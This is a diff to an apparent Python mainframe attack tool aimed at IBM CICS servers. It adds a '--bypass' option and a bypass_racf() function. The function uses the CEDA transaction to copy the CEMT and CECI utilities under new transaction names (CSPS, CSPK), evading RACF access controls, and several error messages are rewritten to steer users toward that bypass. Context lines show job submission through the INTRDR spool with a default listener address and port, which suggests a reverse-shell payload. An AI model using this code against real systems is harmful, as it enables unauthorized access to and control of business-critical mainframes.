@@ -360,6 +360,14 @@ def query_cics(request, verify, line):
     em.send_enter()
         
     data = em.screen_get()
+
+    if "DFHAC2002" in data[22] and "CECI" in data[22]:
+        whine("Cannot access CECI, try --bypass switch to bypass RACF",'err')
+        sys.exit()
+    if "DFHAC2002" in data[22] and "CEMT" in data[22]:
+        whine("Cannot access CEMT, try --bypass switch to bypass RACF",'err')
+        sys.exit()
+        
     if verify in data[line-1].strip():
         return True
     else:
@@ -378,13 +386,20 @@ def get_cics_value(request, identifier, double_enter=False):
         sys.exit()
     
     em.safe_send(format_request(request))
-    
     em.send_enter()
+    data = em.screen_get()
     
+    if "DFHAC2002" in data[22] and "CECI" in data[22]:
+        whine("Cannot access CECI, try --bypass switch to bypass RACF",'err')
+        sys.exit()
+    if "DFHAC2002" in data[22] and "CEMT" in data[22]:
+        whine("Cannot access CEMT, try --bypass switch to bypass RACF",'err')
+        sys.exit()
+        
     if double_enter:
         em.send_enter()
         
-    sleep(SLEEP)
+    sleep(SLEEP)    
     
     em.send_pf5()
     data = em.screen_get()
@@ -423,7 +438,7 @@ def query_cics_scrap(request, pattern, length, depth, scrolls):
     data = em.screen_get()
         
     if "NOT AUTHORIZED" in data[2]:
-        whine (request+" not authorized", 'err')
+        whine("Not authorized to issue "+request+", try --bypass switch to bypass RACF",'err')
         return None
         
     for d in data:
@@ -451,13 +466,22 @@ def send_cics(request, double=False):
     em.move_to(1,2)
     em.safe_send(format_request(request))
     em.send_enter()
+    data = em.screen_get()
     
+    if "DFHAC2002" in data[22] and "CECI" in data[22]:
+        whine("Cannot access CECI, try --bypass switch to bypass RACF",'err')
+        sys.exit()
+    elif "DFHAC2002" in data[22] and "CEMT" in data[22]:
+        whine("Cannot access CEMT, try --bypass switch to bypass RACF",'err')
+        sys.exit()
+        
     if double:
        em.send_enter()
     data = em.screen_get()
     
     if "RESPONSE: NORMAL" in data[22]:
         return True
+    
     else:
         whine('Error:' + data[22],'err')
         return False
@@ -565,15 +589,15 @@ def activate_supplied(old_name, old_group, new_name, new_group):
     data = em.screen_get();
         
     if "already exists" in data[20]:
-        whine("Already copied "+old_name.upper()+" to "+new_name.upper()+" in group "+old_group.upper(),"info")
+        whine("Already copied "+old_name.upper()+" to "+new_name.upper()+" in group "+old_group.upper(),"info",1)
         
     
     elif not "COPY SUCCESSFUL" in data[22]:
-        whine('Could not copy '+old_name.upper()+' to a new transaction name '+new_name.upper()+' in group '+new_group.upper(),'err')
+        whine('Could not copy '+old_name.upper()+' to a new transaction name '+new_name.upper()+' in group '+new_group.upper(),'err',1)
         whine(data[22],'err')
         return False
     else:
-        whine(old_name.upper()+' successfully copied to '+new_name.upper(),'good')
+        whine(old_name.upper()+' successfully copied to '+new_name.upper(),'good',1)
     em.move_to(1,2)
     req_install ="INSTALL TRANS("+new_name.upper()+") GROUP("+new_group.upper()+")"
     em.safe_send(format_request(req_install));
@@ -581,11 +605,11 @@ def activate_supplied(old_name, old_group, new_name, new_group):
     data = em.screen_get();
     
     if not "INSTALL SUCCESSFUL" in data[22]:
-        whine('Could not install new '+new_name.upper()+' transaction in group '+new_group.upper()+'','err')
+        whine('Could not install new '+new_name.upper()+' transaction in group '+new_group.upper()+'','err',1)
         whine(data[22],'err')
         return False
     else:
-        whine(new_name.upper()+' successfully installed','good')
+        whine(new_name.upper()+' successfully installed','good',1)
         
     if old_name.upper()=="CECI":
         CECI = new_name.upper()
@@ -594,7 +618,44 @@ def activate_supplied(old_name, old_group, new_name, new_group):
     em.send_pf3()
     
     return True
+
+def bypass_racf():
+    is_cemt = False
+    is_ceci = False
+    global CEMT
+    global CECI
+    if query_cics('CEDA','ALter',5):
+      em.send_pf3()
+      whine("Bypass of RACF is possible and will be carried out", 'good',1)
+        
+    if query_cics('CSPS','Inquire',5):
+      is_cemt = True
+      em.send_pf3()
+      CEMT = "CSPS"
+      whine("CSPS points to CEMT now. Please use --cemt=CSPS in future commands or keep the --bypass switch", 'good',1)
+      
+    elif not is_cemt and activate_supplied("CEMT","DFHCOMP3","CSPS","DDDD") and query_cics(CEMT,'Inquire',5):
+        em.send_pf3()
+        is_cemt = True
+        whine("CEMT is available under the transaction name CSPS. Please specify --cemt=CSPS in every future command",'good',1)
+    else:
+        whine('Could not copy CEMT to new transaction','err',1);        
+        
+    if query_cics('CSPK','ACquire',5):
+        is_ceci = True
+        em.send_pf3()
+        CECI = "CSPK"
+        whine("CSPK points to CECI now. Please use --ceci=CSPK in future commands or keep the --bypass switch", 'good',1)
     
+    elif not is_ceci and activate_supplied("CECI","DFHCOMP1","CSPK","BBBB") and query_cics(CECI,'ACquire',5):
+        em.send_pf3()
+        is_ceci = True
+        whine("CECI is now available under the transaction name CSPK. Please specify --ceci=CSPK in every future command",'good',1)
+    else:
+        whine('Could not copy CECI to new transaction','err',1);
+    
+    
+      
 def get_infos():
     """
       retrieves meaningful information about CICS
@@ -615,14 +676,14 @@ def get_infos():
        
     whine("Interesting and available IBM supplied transactions: ", 'info')
     if query_cics('CEMT','Inquire',5):
-      is_cemt = False
-      em.send_pf3()
-      whine("CEMT", 'good',1)
+        is_cemt = True
+        em.send_pf3()
+        whine("CEMT", 'good',1)
     
     if query_cics('CEDA','ALter',5):
-      is_ceda = True
-      em.send_pf3()        
-      whine("CEDA", 'good',1)
+        is_ceda = True
+        em.send_pf3()        
+        whine("CEDA", 'good',1)
     
     if query_cics('CECI','ACquire',5):
         is_ceci = True
@@ -655,13 +716,13 @@ def get_infos():
             if not is_ceci and activate_supplied("CECI","DFHCOMP1","CSPK","BBBB") and query_cics(CECI,'ACquire',5):
                 em.send_pf3()
                 is_ceci = True
-                whine("CECI is now available under the transaction name CSPK. Please specify --ceci=CSPK in every future command",'good')
+                whine("CECI is now available under the transaction name CSPK. Please specify --ceci=CSPK in every future command",'good',1)
             else:
                 whine('Could not activate CECI','err');
             if not is_cemt and activate_supplied("CEMT","DFHCOMP3","CSPS","DDDD") and query_cics(CEMT,'Inquire',5):
                 em.send_pf3()
                 is_cemt = True
-                whine("CEMT is available under the transaction name CSPS. Please specify --cemt=CSPS in every future command",'good')
+                whine("CEMT is available under the transaction name CSPS. Please specify --cemt=CSPS in every future command",'good',1)
     
     
     whine("General system information: ", 'info')
@@ -772,8 +833,10 @@ def get_transactions(transid):
         if more:
             em.send_pf11()
       
-     if number_tran == 0:
-       whine('No transaction matched the pattern, start again or make sure you have access to the CEMT utility (-i option)','err')
+     if transid=="*" and number_tran==0:
+         whine('Could not list transactions through Inquire command, try with the switch --bypass','err')
+     elif number_tran == 0:
+       whine('No transaction matched the pattern '+transid+', try again','err')
 
 def get_tsqueues(tsqueue):
      """
@@ -814,8 +877,10 @@ def get_tsqueues(tsqueue):
         if more:
             em.send_pf11()
       
+     if tsqueue=="*" and number_tsq==0:
+         whine('Could not list tsqueues through Inquire command, try with the switch --bypass','err')
      if number_tsq == 0:
-       whine('No tsq matched the pattern, start again or make sure you have access to the CEMT utility (-i option)','err')
+       whine('No tsq matched the pattern '+tsqueue+' try again','err')
    
 def get_files(filename):
      """
@@ -858,8 +923,10 @@ def get_files(filename):
         if more:
             em.send_pf11()
       
-     if number_files == 0:
-       whine('No files matched the pattern, start again or make sure you have access to the CEMT utility (-i option)','err')
+     if filename=="*" and number_files==0:
+         whine('Could not list files through Inquire command, try with the switch --bypass','err')
+     elif number_files == 0:
+       whine('No files matched the pattern','err')
 
 def fetch_tsq_item(tsq_name, item):
     """
@@ -1437,7 +1504,7 @@ def set_mixedCase():
   
 def open_spool():
     """
-        Opens a spool on the LOCAL node
+        Opens a spool to send to INTRDR on local or remote node
     """
     token = None
     em.move_to(1,2)
@@ -1449,6 +1516,12 @@ def open_spool():
     req_open_spool = CECI+" SPOOLOPEN OUTPUT USERID('INTRDR  ') NODE('"+node+"') TOKEN(&TOKTEST)"
     em.safe_send(format_request(req_open_spool))
     em.send_enter()
+    
+    data = em.screen_get()
+    if "DFHAC2002" in data[22] and "CECI" in data[22]:
+        whine("Cannot access CECI, try --bypass switch to bypass RACF",'err')
+        sys.exit()
+       
     em.send_enter()
         
     data = em.screen_get()
@@ -1611,7 +1684,7 @@ def check_tdqueue():
         return False
     
     # activate TDQueue in case it was not
-    send_cics('Set TDQueue ('+queue+') OPE ENA',False)  
+    send_cics(CEMT+' Set TDQueue ('+queue+') OPE ENA',False)  
     em.send_pf3()
     return True
     
@@ -1693,6 +1766,7 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
     
     method = None
     token = open_spool()
+    
     #token = None
     if token:
          method = "spool"
@@ -1949,6 +2023,10 @@ def main(results):
     if not check_valid_applid(results.applid, DO_AUTHENT):
         whine("Applid "+results.applid+" not valid, try again maybe it's a network lag", "err")
         sys.exit()
+    
+    if results.bypass:
+        whine("Bypassing RACF before moving on", 'info')
+        bypass_racf()
 
     if results.info:
         whine("Getting information about CICS server (APPLID: "+results.applid+")", 'info')
@@ -2079,7 +2157,7 @@ if __name__ == "__main__" :
     parser.add_argument('PORT',help='CICS/VTAM server Port')
     parser.add_argument('-a','--applid',help='CICS ApplID on VTAM, default is CICS',default="CICS",dest='applid')
 
-    group_info = parser.add_argument_group("Information gathering")
+    group_info = parser.add_argument_group("General information")
     group_storage = parser.add_argument_group("Storage options")
     group_trans = parser.add_argument_group("Transaction options")
     group_access = parser.add_argument_group("Access options")
@@ -2092,6 +2170,7 @@ if __name__ == "__main__" :
     group_info.add_argument('-q', '--quiet', help='Remove Trailing and journal before performing any action',action='store_true',default=False,dest='journal')
     group_info.add_argument('--ceci', help='CECI new transaction name. Result of -i option.',default="CECI",dest='ceci')
     group_info.add_argument('--cemt', help='CEMT new transaction name. Result of -i option.',default="CEMT",dest='cemt')
+    group_info.add_argument('--bypass', help='if CEDA is available, it copies CEMT and CECI to new transid before using them to bypass RACF',action='store_true',dest='bypass')
     
     
     group_trans.add_argument('-t','--trans', help='Get all installed transactions on a CICS TS server',action='store_true', default=False, dest='trans')
